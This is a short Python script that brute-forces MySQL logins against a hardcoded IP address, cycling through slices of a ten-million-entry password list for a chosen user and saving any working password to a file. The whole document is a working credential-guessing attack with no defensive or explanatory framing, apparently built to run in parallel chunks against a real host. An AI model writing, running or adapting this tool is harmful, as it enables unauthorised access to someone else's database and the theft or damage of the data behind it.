import pymysql,sys,time
user=sys.argv[1]; start=int(sys.argv[2]); count=int(sys.argv[3])
pw=[l.rstrip('\n') for l in open('pw10m.txt')][start:start+count]
for p in pw:
    for attempt in range(2):
        try:
            c=pymysql.connect(host='141.8.192.100',port=3306,user=user,password=p,connect_timeout=6,read_timeout=6)
            print(f'MYSQLHIT {user}:{p}',flush=True); open('HIT_SQL.txt','w').write(user+':'+p+'\n'); sys.exit(0)
        except pymysql.err.OperationalError as e:
            code=e.args[0] if e.args else 0
            if code==1045: break
            time.sleep(0.3)
        except Exception: time.sleep(0.3)
print('MYSQLDONE',start,flush=True)
